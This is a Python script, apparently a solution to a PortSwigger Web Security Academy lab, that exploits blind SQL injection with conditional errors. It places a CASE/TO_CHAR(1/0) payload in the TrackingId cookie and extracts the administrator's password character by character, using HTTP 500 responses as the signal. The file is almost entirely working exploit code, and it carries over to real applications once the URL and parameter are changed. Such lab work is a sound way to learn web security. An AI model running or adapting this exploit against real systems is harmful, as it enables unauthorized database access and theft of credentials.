import requests
import string

#https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

url = "https://0ad20033045b1e3d8022030a0081007c.web-security-academy.net/filter?category=Pets"
admin_password = ''
password_chars = string.ascii_lowercase + string.digits + '~!@#$%^&*()+-/'
for i in range(1, 21):
    found_char = None
    for j in password_chars:
        payload = f"'||(SELECT+CASE+WHEN+SUBSTR(password,{i},1)='{j}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'"
        cookies = {"TrackingId": payload}
        response = requests.get(url, cookies=cookies)
        if response.status_code == 500:
            found_char = j
            break
        
    if found_char:
        admin_password += found_char
        print(f"{i}, character {found_char}")

print('Administrator password: ' + admin_password)
